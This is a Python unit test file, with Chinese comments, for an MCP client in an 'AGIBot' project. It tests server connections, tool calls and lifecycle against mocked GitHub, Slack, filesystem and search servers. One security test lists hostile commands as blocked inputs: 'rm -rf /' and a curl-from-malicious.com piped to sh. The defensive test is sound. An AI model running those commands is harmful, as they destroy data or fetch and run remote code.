#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
第三方MCP服务单元测试
测试外部MCP服务集成、通信、工具调用等功能
"""

import pytest
import os
import sys
import json
import asyncio
import websockets
from unittest.mock import patch, Mock, MagicMock, AsyncMock
from typing import Dict, List, Any

# 添加src路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))

from tools.fastmcp_wrapper import FastMCPWrapper
from tools.mcp_client import MCPClient
from utils.test_helpers import TestHelper

@pytest.mark.unit
class TestMCPServices:
    """MCP服务测试类"""
    
    @pytest.fixture
    def mcp_server_configs(self):
        """MCP服务器配置"""
        return {
            "github": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-github"],
                "env": {
                    "GITHUB_PERSONAL_ACCESS_TOKEN": "test_token"
                },
                "capabilities": ["search_repositories", "get_file_contents", "create_issue"],
                "description": "GitHub服务器，提供仓库搜索和文件操作功能"
            },
            "slack": {
                "command": "npx", 
                "args": ["-y", "@modelcontextprotocol/server-slack"],
                "env": {
                    "SLACK_BOT_TOKEN": "xoxb-test-token",
                    "SLACK_TEAM_ID": "T12345"
                },
                "capabilities": ["send_message", "list_channels", "get_user_info"],
                "description": "Slack服务器，提供消息发送和频道管理功能"
            },
            "memory": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-memory"],
                "env": {},
                "capabilities": ["store_memory", "search_memory", "delete_memory"],
                "description": "内存服务器，提供数据存储和检索功能"
            },
            "filesystem": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
                "env": {},
                "capabilities": ["read_file", "write_file", "list_directory", "create_directory"],
                "description": "文件系统服务器，提供文件操作功能"
            },
            "web_search": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-brave-search"],
                "env": {
                    "BRAVE_API_KEY": "test_brave_key"
                },
                "capabilities": ["web_search", "news_search", "image_search"],
                "description": "网络搜索服务器，提供网络搜索功能"
            }
        }
    
    @pytest.fixture
    def mcp_messages(self):
        """MCP协议消息样例"""
        return {
            "initialize": {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "roots": {
                            "listChanged": True
                        },
                        "sampling": {}
                    },
                    "clientInfo": {
                        "name": "AGIBot",
                        "version": "1.0.0"
                    }
                }
            },
            "list_tools": {
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/list"
            },
            "call_tool": {
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {
                    "name": "search_repositories",
                    "arguments": {
                        "query": "machine learning",
                        "language": "python",
                        "sort": "stars"
                    }
                }
            },
            "list_resources": {
                "jsonrpc": "2.0",
                "id": 4,
                "method": "resources/list"
            }
        }
    
    @pytest.fixture
    def mcp_responses(self):
        """MCP协议响应样例"""
        return {
            "initialize_response": {
                "jsonrpc": "2.0",
                "id": 1,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "tools": {},
                        "resources": {},
                        "prompts": {},
                        "logging": {}
                    },
                    "serverInfo": {
                        "name": "github-server",
                        "version": "1.0.0"
                    }
                }
            },
            "tools_list_response": {
                "jsonrpc": "2.0",
                "id": 2,
                "result": {
                    "tools": [
                        {
                            "name": "search_repositories",
                            "description": "Search for GitHub repositories",
                            "inputSchema": {
                                "type": "object",
                                "properties": {
                                    "query": {"type": "string"},
                                    "language": {"type": "string"},
                                    "sort": {"type": "string"}
                                },
                                "required": ["query"]
                            }
                        }
                    ]
                }
            },
            "tool_call_response": {
                "jsonrpc": "2.0",
                "id": 3,
                "result": {
                    "content": [
                        {
                            "type": "text",
                            "text": "Found 50 repositories matching 'machine learning'"
                        }
                    ],
                    "isError": False
                }
            }
        }
    
    @pytest.fixture
    def mcp_client(self, test_workspace):
        """创建MCP客户端实例"""
        return MCPClient(workspace_root=test_workspace)
    
    @pytest.fixture
    def fastmcp_wrapper(self, test_workspace):
        """创建FastMCP包装器实例"""
        return FastMCPWrapper(workspace_root=test_workspace)
    
    def test_mcp_client_initialization(self, mcp_client):
        """测试MCP客户端初始化"""
        assert mcp_client is not None
        assert hasattr(mcp_client, 'connect_server')
        assert hasattr(mcp_client, 'call_tool')
        assert hasattr(mcp_client, 'list_tools')
    
    def test_mcp_server_connection(self, mcp_client, mcp_server_configs):
        """测试MCP服务器连接"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟服务器进程
            mock_process = Mock()
            mock_process.stdout.readline.return_value = b'{"jsonrpc": "2.0", "method": "notifications/initialized"}\n'
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            # 测试连接GitHub服务器
            github_config = mcp_server_configs["github"]
            result = mcp_client.connect_server("github", github_config)
            
            # 验证连接结果
            assert result is not None
            if isinstance(result, dict):
                assert result.get("success") is not False
    
    def test_mcp_protocol_handshake(self, mcp_client, mcp_messages, mcp_responses):
        """测试MCP协议握手"""
        with patch.object(mcp_client, '_send_message') as mock_send:
            with patch.object(mcp_client, '_receive_message') as mock_receive:
                # 模拟握手响应
                mock_receive.return_value = mcp_responses["initialize_response"]
                
                # 执行握手
                result = mcp_client.initialize()
                
                # 验证握手
                assert result is not None
                mock_send.assert_called_once()
                mock_receive.assert_called_once()
    
    def test_tools_discovery(self, mcp_client, mcp_responses):
        """测试工具发现"""
        with patch.object(mcp_client, '_send_message') as mock_send:
            with patch.object(mcp_client, '_receive_message') as mock_receive:
                # 模拟工具列表响应
                mock_receive.return_value = mcp_responses["tools_list_response"]
                
                # 获取工具列表
                tools = mcp_client.list_tools()
                
                # 验证工具发现
                assert tools is not None
                if isinstance(tools, dict) and "tools" in tools:
                    assert len(tools["tools"]) > 0
                    assert tools["tools"][0]["name"] == "search_repositories"
    
    def test_tool_execution(self, mcp_client, mcp_messages, mcp_responses):
        """测试工具执行"""
        with patch.object(mcp_client, '_send_message') as mock_send:
            with patch.object(mcp_client, '_receive_message') as mock_receive:
                # 模拟工具调用响应
                mock_receive.return_value = mcp_responses["tool_call_response"]
                
                # 执行工具
                result = mcp_client.call_tool(
                    "search_repositories",
                    {
                        "query": "machine learning",
                        "language": "python"
                    }
                )
                
                # 验证工具执行
                assert result is not None
                if isinstance(result, dict):
                    assert "content" in result or "result" in result
    
    def test_github_integration(self, mcp_client, mcp_server_configs):
        """测试GitHub集成"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟GitHub服务器
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'{"jsonrpc": "2.0", "id": 1, "result": {"repositories": [{"name": "test-repo"}]}}',
                b''
            )
            mock_popen.return_value = mock_process
            
            # 连接GitHub服务器
            github_config = mcp_server_configs["github"]
            connection = mcp_client.connect_server("github", github_config)
            
            if connection:
                # 测试仓库搜索
                result = mcp_client.call_tool("search_repositories", {
                    "query": "AGI",
                    "language": "python"
                })
                
                # 验证GitHub集成
                assert result is not None
    
    def test_slack_integration(self, mcp_client, mcp_server_configs):
        """测试Slack集成"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟Slack服务器
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'{"jsonrpc": "2.0", "id": 1, "result": {"ok": true, "ts": "1234567890.123"}}',
                b''
            )
            mock_popen.return_value = mock_process
            
            # 连接Slack服务器
            slack_config = mcp_server_configs["slack"]
            connection = mcp_client.connect_server("slack", slack_config)
            
            if connection:
                # 测试发送消息
                result = mcp_client.call_tool("send_message", {
                    "channel": "#general",
                    "text": "Hello from AGIBot!"
                })
                
                # 验证Slack集成
                assert result is not None
    
    def test_memory_server_integration(self, mcp_client, mcp_server_configs):
        """测试内存服务器集成"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟内存服务器
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'{"jsonrpc": "2.0", "id": 1, "result": {"stored": true, "id": "mem_123"}}',
                b''
            )
            mock_popen.return_value = mock_process
            
            # 连接内存服务器
            memory_config = mcp_server_configs["memory"]
            connection = mcp_client.connect_server("memory", memory_config)
            
            if connection:
                # 测试存储记忆
                result = mcp_client.call_tool("store_memory", {
                    "content": "AGIBot测试记忆",
                    "tags": ["test", "agibot"]
                })
                
                # 验证内存服务器集成
                assert result is not None
    
    def test_filesystem_server_integration(self, mcp_client, mcp_server_configs):
        """测试文件系统服务器集成"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟文件系统服务器
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'{"jsonrpc": "2.0", "id": 1, "result": {"content": "file content", "encoding": "utf-8"}}',
                b''
            )
            mock_popen.return_value = mock_process
            
            # 连接文件系统服务器
            fs_config = mcp_server_configs["filesystem"]
            connection = mcp_client.connect_server("filesystem", fs_config)
            
            if connection:
                # 测试读取文件
                result = mcp_client.call_tool("read_file", {
                    "path": "/tmp/test.txt"
                })
                
                # 验证文件系统集成
                assert result is not None
    
    def test_web_search_integration(self, mcp_client, mcp_server_configs):
        """测试网络搜索集成"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟搜索服务器
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'{"jsonrpc": "2.0", "id": 1, "result": {"results": [{"title": "Test Result", "url": "https://example.com"}]}}',
                b''
            )
            mock_popen.return_value = mock_process
            
            # 连接搜索服务器
            search_config = mcp_server_configs["web_search"]
            connection = mcp_client.connect_server("web_search", search_config)
            
            if connection:
                # 测试网络搜索
                result = mcp_client.call_tool("web_search", {
                    "query": "AGI Bot artificial intelligence",
                    "count": 10
                })
                
                # 验证搜索集成
                assert result is not None
    
    def test_multiple_server_management(self, mcp_client, mcp_server_configs):
        """测试多服务器管理"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟多个服务器进程
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            connected_servers = []
            
            # 连接多个服务器
            for server_name, config in mcp_server_configs.items():
                try:
                    connection = mcp_client.connect_server(server_name, config)
                    if connection:
                        connected_servers.append(server_name)
                except Exception:
                    pass
            
            # 验证多服务器管理
            assert len(connected_servers) >= 0
            
            # 测试服务器状态查询
            if hasattr(mcp_client, 'get_server_status'):
                for server_name in connected_servers:
                    status = mcp_client.get_server_status(server_name)
                    assert status is not None
    
    def test_error_handling_in_mcp_communication(self, mcp_client):
        """测试MCP通信错误处理"""
        # 测试连接失败
        invalid_config = {
            "command": "nonexistent_command",
            "args": ["--invalid"],
            "env": {}
        }
        
        with patch('subprocess.Popen', side_effect=FileNotFoundError):
            result = mcp_client.connect_server("invalid", invalid_config)
            
            # 验证错误处理
            assert result is not None
            if isinstance(result, dict):
                assert result.get("success") is False or "error" in result
    
    def test_mcp_message_validation(self, mcp_client, mcp_messages):
        """测试MCP消息验证"""
        # 测试有效消息
        valid_message = mcp_messages["initialize"]
        
        if hasattr(mcp_client, 'validate_message'):
            assert mcp_client.validate_message(valid_message) is True
        
        # 测试无效消息
        invalid_messages = [
            {},  # 空消息
            {"jsonrpc": "1.0"},  # 错误版本
            {"jsonrpc": "2.0", "method": ""},  # 空方法
            {"jsonrpc": "2.0"}  # 缺少方法
        ]
        
        for invalid_msg in invalid_messages:
            if hasattr(mcp_client, 'validate_message'):
                assert mcp_client.validate_message(invalid_msg) is False
    
    def test_resource_discovery(self, mcp_client, mcp_messages):
        """测试资源发现"""
        with patch.object(mcp_client, '_send_message') as mock_send:
            with patch.object(mcp_client, '_receive_message') as mock_receive:
                # 模拟资源列表响应
                mock_receive.return_value = {
                    "jsonrpc": "2.0",
                    "id": 4,
                    "result": {
                        "resources": [
                            {
                                "uri": "file:///tmp/test.txt",
                                "name": "Test File",
                                "description": "A test file",
                                "mimeType": "text/plain"
                            }
                        ]
                    }
                }
                
                # 获取资源列表
                resources = mcp_client.list_resources()
                
                # 验证资源发现
                assert resources is not None
                if isinstance(resources, dict) and "resources" in resources:
                    assert len(resources["resources"]) > 0
    
    def test_concurrent_tool_calls(self, mcp_client):
        """测试并发工具调用"""
        import threading
        import time
        
        results = []
        errors = []
        
        def call_tool_concurrently(tool_name, args, call_id):
            try:
                with patch.object(mcp_client, '_send_message'):
                    with patch.object(mcp_client, '_receive_message') as mock_receive:
                        # 模拟响应
                        mock_receive.return_value = {
                            "jsonrpc": "2.0",
                            "id": call_id,
                            "result": {"success": True, "call_id": call_id}
                        }
                        
                        result = mcp_client.call_tool(tool_name, args)
                        results.append((call_id, result))
            except Exception as e:
                errors.append((call_id, e))
        
        # 创建并发调用
        threads = []
        for i in range(5):
            thread = threading.Thread(
                target=call_tool_concurrently,
                args=("test_tool", {"param": f"value_{i}"}, i)
            )
            threads.append(thread)
            thread.start()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join(timeout=10)
        
        # 验证并发调用
        assert len(errors) == 0
        assert len(results) == 5
    
    def test_mcp_server_lifecycle(self, mcp_client, mcp_server_configs):
        """测试MCP服务器生命周期"""
        with patch('subprocess.Popen') as mock_popen:
            # 模拟服务器进程
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_process.terminate.return_value = None
            mock_popen.return_value = mock_process
            
            # 启动服务器
            github_config = mcp_server_configs["github"]
            connection = mcp_client.connect_server("github", github_config)
            
            if connection:
                # 验证服务器运行状态
                if hasattr(mcp_client, 'is_server_running'):
                    assert mcp_client.is_server_running("github") is True
                
                # 停止服务器
                if hasattr(mcp_client, 'disconnect_server'):
                    result = mcp_client.disconnect_server("github")
                    assert result is not None
                
                # 验证服务器已停止
                if hasattr(mcp_client, 'is_server_running'):
                    assert mcp_client.is_server_running("github") is False
    
    def test_fastmcp_wrapper_functionality(self, fastmcp_wrapper):
        """测试FastMCP包装器功能"""
        # 测试初始化
        assert fastmcp_wrapper is not None
        assert hasattr(fastmcp_wrapper, 'call_mcp_tool')
        
        # 模拟MCP工具调用
        with patch.object(fastmcp_wrapper, 'call_mcp_tool') as mock_call:
            mock_call.return_value = {"success": True, "result": "test result"}
            
            result = fastmcp_wrapper.call_mcp_tool("test_tool", {"param": "value"})
            
            # 验证包装器功能
            assert result is not None
            assert result["success"] is True
    
    def test_mcp_configuration_management(self, test_workspace):
        """测试MCP配置管理"""
        config_file = os.path.join(test_workspace, "mcp_servers.json")
        
        # 创建配置文件
        mcp_config = {
            "mcpServers": {
                "github": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-github"],
                    "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "test_token"}
                }
            }
        }
        
        with open(config_file, "w") as f:
            json.dump(mcp_config, f, indent=2)
        
        # 加载配置
        if hasattr(MCPClient, 'load_config'):
            loaded_config = MCPClient.load_config(config_file)
            assert loaded_config is not None
            assert "mcpServers" in loaded_config
            assert "github" in loaded_config["mcpServers"]
    
    def test_mcp_security_validation(self, mcp_client):
        """测试MCP安全验证"""
        # 测试危险命令阻断
        dangerous_configs = [
            {
                "command": "rm",
                "args": ["-rf", "/"],
                "env": {}
            },
            {
                "command": "curl",
                "args": ["http://malicious.com/script.sh", "|", "sh"],
                "env": {}
            }
        ]
        
        for dangerous_config in dangerous_configs:
            try:
                result = mcp_client.connect_server("dangerous", dangerous_config)
                
                # 验证安全措施
                if result is not None and isinstance(result, dict):
                    assert (result.get("success") is False or 
                           "security" in result.get("error", "").lower() or
                           "blocked" in result.get("message", "").lower())
            except Exception as e:
                # 抛出安全异常是可以接受的
                assert "security" in str(e).lower() or "blocked" in str(e).lower()
    
    def test_mcp_performance_monitoring(self, mcp_client):
        """测试MCP性能监控"""
        import time
        
        # 模拟性能监控
        with patch.object(mcp_client, 'call_tool') as mock_call:
            def slow_response(*args, **kwargs):
                time.sleep(0.1)  # 模拟延迟
                return {"success": True, "execution_time": 100}
            
            mock_call.side_effect = slow_response
            
            start_time = time.time()
            result = mcp_client.call_tool("slow_tool", {})
            end_time = time.time()
            
            execution_time = end_time - start_time
            
            # 验证性能监控
            assert result is not None
            assert execution_time >= 0.1  # 应该记录执行时间
    
    def test_mcp_batch_operations(self, mcp_client):
        """测试MCP批量操作"""
        # 模拟批量工具调用
        batch_calls = [
            {"tool": "search_repositories", "args": {"query": "python"}},
            {"tool": "search_repositories", "args": {"query": "javascript"}},
            {"tool": "search_repositories", "args": {"query": "go"}}
        ]
        
        with patch.object(mcp_client, 'call_tool') as mock_call:
            mock_call.return_value = {"success": True, "results": []}
            
            # 执行批量操作（如果支持）
            if hasattr(mcp_client, 'batch_call_tools'):
                results = mcp_client.batch_call_tools(batch_calls)
                assert results is not None
                assert len(results) == len(batch_calls)
            else:
                # 逐个调用
                results = []
                for call in batch_calls:
                    result = mcp_client.call_tool(call["tool"], call["args"])
                    results.append(result)
                assert len(results) == len(batch_calls)
    
    def test_mcp_event_handling(self, mcp_client):
        """测试MCP事件处理"""
        events_received = []
        
        def event_handler(event):
            events_received.append(event)
        
        # 注册事件处理器（如果支持）
        if hasattr(mcp_client, 'register_event_handler'):
            mcp_client.register_event_handler("tool_called", event_handler)
        
        # 模拟工具调用触发事件
        with patch.object(mcp_client, 'call_tool') as mock_call:
            mock_call.return_value = {"success": True}
            
            result = mcp_client.call_tool("test_tool", {})
            
            # 验证事件处理
            assert result is not None
            if hasattr(mcp_client, 'register_event_handler'):
                # 检查是否触发了事件
                assert len(events_received) >= 0 